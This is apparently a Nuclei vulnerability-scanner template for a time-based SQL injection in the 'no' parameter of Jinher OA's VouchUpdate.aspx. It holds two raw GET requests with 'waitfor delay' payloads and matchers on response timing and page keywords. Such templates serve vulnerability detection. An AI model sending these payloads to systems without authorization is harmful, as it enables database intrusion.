id: poc-jinher-jhsoft-vouchupdate-aspx-sqli
info:
  name: "Jinher OA VouchUpdate.aspx 接口存在 SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: Jinher OA
  description: |
    Jinher OA VouchUpdate.aspx is vulnerable to a SQL injection vulnerability via the 'no' parameter.

http:
  - raw:
      - |
        GET /c6/JHSoft.Web.CostControl/BudgetExecution/VouchUpdate.aspx/?no=1'waitfor+delay%270:0:5%27--&type=1 HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /c6/JHSoft.Web.CostControl/BudgetExecution/VouchUpdate.aspx/?no=1'waitfor+delay%270:0:8%27--&type=1 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "修改凭证"
          - "现金流项目"
          - "费用科目"
      - type: dsl
        dsl:
          - "status_code == 200"
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
